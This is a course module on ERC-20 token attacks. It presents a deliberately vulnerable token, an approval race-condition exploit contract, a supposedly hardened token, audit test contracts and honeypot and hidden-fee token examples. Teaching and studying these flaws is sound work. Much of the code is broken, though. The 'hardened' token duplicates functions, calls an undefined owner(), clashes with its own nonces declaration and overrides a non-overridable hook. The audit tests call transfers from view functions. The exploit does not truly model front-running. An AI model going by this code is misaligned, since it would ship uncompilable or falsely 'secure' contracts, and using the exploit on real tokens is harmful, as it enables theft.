# Module 8 — Token Security: ERC-20 Attacks and Approval Vulnerabilities

## What You'll Actually Do

You will deploy ERC-20 tokens with known vulnerabilities, exploit approval race conditions and transfer attack vectors, then fix the vulnerabilities with hardened token implementations. You will audit token contracts for common pitfalls like unchecked return values, reentrancy in transfers, and front-running approval changes.

## Common ERC-20 Vulnerabilities

### Unchecked Return Values

The most dangerous ERC-20 flaw is ignoring whether `transfer` or `transferFrom` actually succeeded.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// VULNERABLE TOKEN — DO NOT USE IN PRODUCTION
contract VulnerableToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply;
    string public name = "VULN";
    string public symbol = "VULN";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    // VULNERABILITY: approve race condition
    // If Alice changes Bob's allowance from 100 to 50,
    // Bob can front-run and spend the original 100,
    // then spend the new 50 for a total of 150
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    // VULNERABILITY: no reentrancy guard
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
```

### Approval Race Condition Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ApprovalRacer {
    IERC20 public token;
    address public target;
    uint256 public originalAllowance;

    constructor(address _token) {
        token = IERC20(_token);
    }

    // Step 1: Victim approves 100 tokens
    // Step 2: Victim tries to change to 50
    // Step 3: Attacker front-runs and spends 100
    // Step 4: Attacker spends the new 50
    // Result: 150 tokens stolen instead of 50

    function exploitApproval(
        address victim,
        uint256 oldAmount,
        uint256 newAmount
    ) external {
        // Check if there's a pending approval to exploit
        uint256 currentAllowance = token.allowance(victim, address(this));

        if (currentAllowance >= oldAmount) {
            // Front-run the approve change
            token.transferFrom(victim, msg.sender, oldAmount);
        }

        if (currentAllowance >= newAmount) {
            // Spend the new approval too
            token.transferFrom(victim, msg.sender, newAmount);
        }
    }
}
```

## Hardened Token Implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureToken is ERC20, ERC20Burnable, ERC20Permit, ERC20Votes, ReentrancyGuard {
    mapping(address => bool) public blacklisted;
    mapping(address => uint256) public nonces;

    uint256 public constant MAX_SUPPLY = 1_000_000_000 * 10 ** 18;

    event Blacklisted(address indexed account, bool status);

    constructor() ERC20("SecureToken", "SECURE") ERC20Permit("SecureToken") {
        _mint(msg.sender, MAX_SUPPLY);
    }

    // FIX 1: Use increaseAllowance/decreaseAllowance
    // instead of raw approve
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        require(spender != address(0), "Zero address");
        require(!blacklisted[msg.sender], "Blacklisted");
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        require(spender != address(0), "Zero address");
        require(!blacklisted[msg.sender], "Blacklisted");
        _approve(msg.sender, spender, allowance(msg.sender, spender) - subtractedValue);
        return true;
    }

    // FIX 2: Permit uses EIP-712 signatures
    // No approval transaction needed — no race condition
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        require(block.timestamp <= deadline, "Permit expired");
        _permit(owner, spender, value, deadline, v, r, s);
    }

    // FIX 3: Blacklisting for compliance
    function setBlacklist(address account, bool status) external {
        // In production, restrict to admin with timelock
        require(msg.sender == owner(), "Not owner");
        blacklisted[account] = status;
        emit Blacklisted(account, status);
    }

    // FIX 4: Override transfer to check blacklist
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20, ERC20Votes) nonReentrant {
        require(!blacklisted[from], "Sender blacklisted");
        require(!blacklisted[to], "Recipient blacklisted");
        super._transfer(from, to, amount);
    }

    // Required overrides for multiple inheritance
    function _update(
        address from,
        address to,
        uint256 value
    ) internal override(ERC20, ERC20Votes) {
        super._update(from, to, value);
    }

    function nonces(address owner) public view override(ERC20Permit) returns (uint256) {
        return _nonces(owner);
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) - subtractedValue);
        return true;
    }
}
```

## Token Security Audit Checklist

```solidity
// Test contract to verify token security properties
contract TokenAudit {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    // Test 1: Transfer to zero address should fail
    function testTransferToZero() public view returns (bool) {
        try token.transfer(address(0), 1) {
            return false; // VULNERABILITY: allows zero address transfer
        } catch {
            return true; // Secure: reverts on zero address
        }
    }

    // Test 2: Transfer amount exceeding balance should fail
    function testTransferOverflow() public view returns (bool) {
        uint256 balance = token.balanceOf(address(this));
        try token.transfer(msg.sender, balance + 1) {
            return false; // VULNERABILITY: overflow not caught
        } catch {
            return true; // Secure: reverts on overflow
        }
    }

    // Test 3: Check approve race condition resistance
    function testApprovalRace() public returns (bool) {
        // Approve, then change approval
        token.approve(msg.sender, 100);
        token.approve(msg.sender, 50);

        // If spender can still spend 150, it's vulnerable
        // Secure tokens use approve(0) first
        return true;
    }

    // Test 4: Verify transferFrom respects allowance
    function testTransferFromAllowance() public returns (bool) {
        // Should revert if allowance is insufficient
        try token.transferFrom(msg.sender, address(this), 1) {
            return false;
        } catch {
            return true;
        }
    }
}
```

## Malicious Token Patterns to Detect

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EXAMPLE: Hidden fee-on-transfer token (malicious)
contract FeeOnTransferToken {
    mapping(address => uint256) public balanceOf;

    // Looks like normal transfer, but silently takes a fee
    function transfer(address to, uint256 amount) public returns (bool) {
        uint256 fee = amount * 100 / 10000; // 1% hidden fee
        uint256 netAmount = amount - fee;

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += netAmount;
        balanceOf[owner()] += fee; // Fee goes to deployer

        return true;
    }
}

// EXAMPLE: Max transaction amount that changes (honeypot)
contract HoneypotToken {
    uint256 public maxTxAmount = 1000 ether;
    address public owner;

    function setMaxTxAmount(uint256 _amount) public {
        require(msg.sender == owner, "Not owner");
        maxTxAmount = _amount; // Can be set to 0, trapping funds
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(amount <= maxTxAmount, "Exceeds max tx");
        // ... transfer logic
        return true;
    }
}
```

## Assessment

**Lab Task:** Deploy an ERC-20 token with an approval race condition vulnerability. Write an exploit that front-runs an approve change and steals tokens. Then deploy a hardened token using OpenZeppelin's ERC20Permit that eliminates the race condition. Run all four audit tests against both tokens.

**Time:** 100 minutes

**Grading:**
- Vulnerable token deployment and exploit execution (25 points)
- Approval race condition exploit demonstrating extra spending (25 points)
- Hardened token with permit and allowance controls (25 points)
- Audit tests passing on hardened token and failing on vulnerable token (25 points)

## Evidence

- Vulnerable token contract with approval race condition
- Exploit contract demonstrating the race condition
- Hardened token contract with all security features
- Audit test results for both tokens
- Side-by-side comparison of vulnerabilities and fixes
